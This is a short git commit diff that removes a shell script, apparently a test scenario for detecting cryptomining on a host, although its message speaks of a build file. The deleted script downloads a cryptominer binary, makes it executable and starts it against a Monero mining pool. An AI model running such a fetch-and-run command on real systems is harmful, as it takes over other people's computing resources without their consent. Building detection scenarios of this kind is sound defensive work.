ea229c2872f3d34e416ae38ebe3f8eaaa6da83d7
bajacloud <matias@bajacloud.io>
2025-02-01 20:30:16 -0500

    updated build-and-push.yml

--- app/scenarios/process/cryptominer.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-
-# Type: Process
-# Policy: Crypto mining threats
-# Impact:Process/CryptoCurrency.CryptoMinerExecuted
-
-wget -O my_miner_test https://github.com/cnrig/cnrig/releases/download/v0.1.5-release/cnrig-0.1.5-linux-x86_64 && chmod +x my_miner_test && ./my_miner_test -o stratum+tcp://xmr.pool.minergate.com:45700 -u foo@yahoo.com -p bar
